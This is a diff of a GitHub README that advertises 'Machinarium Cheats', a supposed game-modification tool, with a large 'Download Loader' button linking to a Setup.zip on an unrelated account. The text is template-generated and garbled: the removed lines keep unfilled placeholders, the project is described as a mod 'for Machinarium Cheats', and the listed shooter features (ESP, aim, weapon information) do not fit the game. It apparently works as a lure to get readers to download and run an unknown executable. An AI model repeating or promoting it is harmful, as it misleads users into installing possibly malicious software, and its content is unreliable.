@@ -1,2 +1,40 @@
-# Machinarium-Cheats
-{title} is a feature-rich third-party modification project for {Machinarium Cheats}.
+<div align="center">
+
+# 🎮 Machinarium Cheats
+
+> ⚡ Advanced Game Modification Project for Machinarium Cheats
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+Machinarium Cheats is a feature-rich third-party modification project for Machinarium Cheats.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`Machinarium-Cheats` · Updated: 2026-11-07
+
+**Tags:** `machinarium`
